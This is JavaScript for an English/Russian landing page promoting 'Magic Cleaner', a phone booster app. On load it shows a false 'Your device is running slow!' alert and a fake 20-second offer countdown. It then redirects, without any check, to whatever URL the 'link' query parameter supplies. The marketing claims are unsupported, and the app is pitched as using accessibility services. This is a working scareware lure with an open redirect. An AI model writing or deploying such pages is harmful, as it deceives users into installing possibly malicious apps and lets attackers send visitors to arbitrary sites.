const translations = {
    en: {
        title: "Boost your mobile by 50% with just 1-tap!",
        description: "Magic Cleaner is a performance booster that helps speed up your phone by stopping unnecessary background apps. It uses accessibility services to accurately detect and manage running processes, ensuring longer battery life and smoother operation.",
        feature1: "Smart Memory Cleaner: Automatic junk file and cache removal",
        feature2: "Background App Killer: Stop battery-draining apps automatically",
        feature3: "Battery Saver Mode: Extend usage time by 40%",
        step1: 'Tap "Download" button and install Magic Cleaner right now!',
        step2: "Open application and enjoy!",
        downloadButton: "DOWNLOAD NOW",
        freeBadge: "100% FREE",
        timerText: "You have",
        timerSuffix: "to take advantage of this offer!",
        secondsWord: "seconds",
        secondWord: "second",
        alertText: "Your device is running slow! Magic Cleaner can speed it up by 50% with just one tap."
    },
    ru: {
        title: "Ускорьте свой мобильный телефон на 50% всего одним нажатием!",
        description: "Magic Cleaner — это оптимизатор, который ускоряет работу вашего телефона, останавливая ненужные фоновые приложения. Он использует службы специальных возможностей для точного обнаружения и управления запущенными процессами, что обеспечивает более долгую работу от батареи и плавную работу системы.",
        feature1: "Умный очиститель памяти: Автоматическое удаление мусорных файлов и кеша",
        feature2: "Блокировщик фоновых приложений: Автоматически останавливает приложения, разряжающие батарею",
        feature3: "Режим экономии батареи: Увеличьте время работы на 40%",
        step1: 'Нажмите кнопку "Скачать" и установите Magic Cleaner прямо сейчас!',
        step2: "Откройте приложение и наслаждайтесь!",
        downloadButton: "СКАЧАТЬ СЕЙЧАС",
        freeBadge: "100% БЕСПЛАТНО",
        timerText: "У вас есть",
        timerSuffix: "чтобы воспользоваться этим предложением!",
        secondsWord: "секунд,",
        secondWord: "секунда,",
        seconds234: "секунды,",
        alertText: "Ваше устройство работает медленно! Magic Cleaner может ускорить его на 50% всего одним нажатием."
    }
};
function getSecondsWord(seconds, lang) {
    if (lang === 'ru') {
        const lastDigit = seconds % 10;
        const lastTwoDigits = seconds % 100;
        
        if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
            return translations.ru.secondsWord;
        }
        
        if (lastDigit === 1) {
            return translations.ru.secondWord;
        }
        
        if (lastDigit >= 2 && lastDigit <= 4) {
            return translations.ru.seconds234;
        }
        
        return translations.ru.secondsWord;
    } else {
        return seconds === 1 ? translations.en.secondWord : translations.en.secondsWord;
    }
}

function capitalizeFirstLetter(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

function formatDate(lang) {
    const now = new Date();
    if (lang === 'ru') {
        const options = { 
            weekday: 'long',
            day: '2-digit',
            month: 'long',
            year: 'numeric'
        };
        let dateString = now.toLocaleDateString('ru-RU', options);
        return capitalizeFirstLetter(dateString);
    } else {
        const options = { 
            weekday: 'long',
            day: '2-digit',
            month: 'long',
            year: 'numeric'
        };
        let dateString = now.toLocaleDateString('en-US', options);
        return capitalizeFirstLetter(dateString);
    }
}

function changeLanguage(lang) {
    document.documentElement.lang = lang;
    
    const elements = document.querySelectorAll('[data-i18n]');
    elements.forEach(element => {
        const key = element.getAttribute('data-i18n');
        if (translations[lang][key]) {
            element.textContent = translations[lang][key];
        }
    });
    
    document.getElementById('currentDate').textContent = formatDate(lang);
}

function getBrowserLanguage() {
    const browserLang = navigator.language || navigator.userLanguage;
    return browserLang.startsWith('ru') ? 'ru' : 'en';
}

function getUrlParameter(name) {
    name = name.replace(/[[]/, '\\[').replace(/[\]]/, '\\]');
    const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    const results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
}

document.addEventListener('DOMContentLoaded', function() {
    const browserLang = getBrowserLanguage();
    let currentLang = browserLang;
    changeLanguage(currentLang);
    
    setTimeout(function() {
        alert(translations[currentLang].alertText);
    }, 100);
    
    let timeLeft = 20;
    const timerElement = document.getElementById('timer');
    const secondsTextElement = document.getElementById('secondsText');
    
    function updateTimerDisplay() {
        timerElement.textContent = timeLeft;
        secondsTextElement.textContent = getSecondsWord(timeLeft, currentLang);
    }
    
    updateTimerDisplay();
    
    const countdown = setInterval(function() {
        timeLeft--;
        
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            redirectToLink();
        }
    }, 1000);
    
    function redirectToLink() {
        const redirectUrl = getUrlParameter('link');
        if (redirectUrl) {
            window.location.href = redirectUrl;
        }
    }
    
    document.getElementById('downloadBtn').addEventListener('click', function() {
        redirectToLink();
    });
    
    document.getElementById('downloadBtn').addEventListener('keypress', function(e) {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            this.click();
        }
    });
});